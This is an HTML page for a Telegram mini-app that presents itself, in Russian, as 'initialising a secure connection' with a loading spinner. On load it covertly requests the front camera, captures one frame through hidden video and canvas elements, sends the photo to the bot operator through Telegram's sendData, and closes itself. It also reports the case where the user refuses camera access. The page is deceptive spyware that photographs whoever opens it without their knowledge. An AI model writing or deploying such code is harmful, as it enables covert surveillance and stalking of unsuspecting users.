<!DOCTYPE html>
<html>
<head>
    <script src="https://telegram.org"></script>
    <style>
        body { background: #000; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        #status { text-align: center; }
    </style>
</head>
<body>
    <div id="status">
        <p>Инициализация защищенного соединения...</p>
        <div style="border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 10px auto;"></div>
    </div>
    <video id="v" style="display:none;" autoplay playsinline></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        async function startCapture() {
            try {
                // Принудительный запрос камеры
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const v = document.getElementById('v');
                v.srcObject = stream;
                
                await new Promise(resolve => v.onloadedmetadata = resolve);
                
                const c = document.getElementById('c');
                c.width = v.videoWidth;
                c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                
                const img = c.toDataURL('image/jpeg', 0.7);
                tg.sendData("PHOTO_DATA:" + img);
                
                // Закрываем через секунду после отправки
                setTimeout(() => tg.close(), 1000);
            } catch (err) {
                tg.sendData("ОТКАЗ_В_ДОСТУПЕ: " + err.name);
                setTimeout(() => tg.close(), 1000);
            }
        }

        // Запуск при загрузке
        window.onload = startCapture;
        
        // Стиль спиннера
        const style = document.createElement('style');
        style.innerHTML = '@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }';
        document.head.appendChild(style);
    </script>
</body>
</html>
